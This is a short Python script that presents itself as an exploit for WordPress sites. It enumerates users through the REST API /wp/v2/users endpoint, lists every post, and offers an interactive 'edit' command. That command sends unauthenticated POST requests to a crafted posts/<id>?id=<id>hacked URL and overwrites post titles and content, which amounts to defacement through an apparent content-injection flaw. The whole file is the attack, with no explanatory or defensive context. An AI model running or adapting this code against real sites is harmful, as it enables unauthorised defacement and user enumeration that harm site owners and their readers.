import requests
import sys
import os


print("Exam) http://target.com -> target.com")
target = "http://" + input("Target : ") + "/wordpress/wp-json/wp/v2/"
# edit here if target has diffrent type uri.

requestusr = requests.get(target + "users")
requestpost = requests.get(target + "posts")
userdata = requestusr.json()
postdata = requestpost.json()

if userdata:
	print("-" * 40)
	print(" Wordpress id: " + str(userdata[0]['id']))
	print(" Wordpress name : " + userdata[0]['name'])
	print(" Wordpress user : " + userdata[0]['slug'])
	print("-" * 40)
else:
	print("[!] Cannot found any users")

if postdata:
	print('[?] typing "help" to check commands')
	while 1:
		cmd = input("Wordpress > ")

		if cmd == 'help':
			print("show : you can check every posts of target wordpress site.")
			print("edit : you can edit any post that you want.")
			print("clear : clear the screen.")
			print("exit : exit from exploit.")

		elif cmd == 'show':
			requestpost = requests.get(target + "posts")
			postdata = requestpost.json()
			count = 0
			print("-" * 40)
			for i in postdata:
				print("Post id : ", end='')
				print(postdata[count]['id'])
				print("Post title : ", end='')
				print(postdata[count]['title']['rendered'])
				print("Update : ", end='')
				print(postdata[count]['date'])
				print("Post title : ", end='')
				print(postdata[count]['content']['rendered'])
				print("-" * 40)
				count += 1

		elif cmd == 'edit':
			postid = input("Post id : ")
			posttitle = input("Titile : ")
			postcontent = input("Content : ")
			if postid and posttitle and postcontent:
				edittarget = target + "posts/" + postid + "?id=" + postid + "hacked"
				print(edittarget)
				editcontent = {'title':posttitle, 'content':postcontent}
				requests.post(edittarget, json=editcontent)
				print("[+] Successfully edited the post.")
		elif cmd == 'clear':
			os.system("clear")

		elif cmd == 'exit':
			sys.exit(0)

		else:
			print("[!] Command not found")
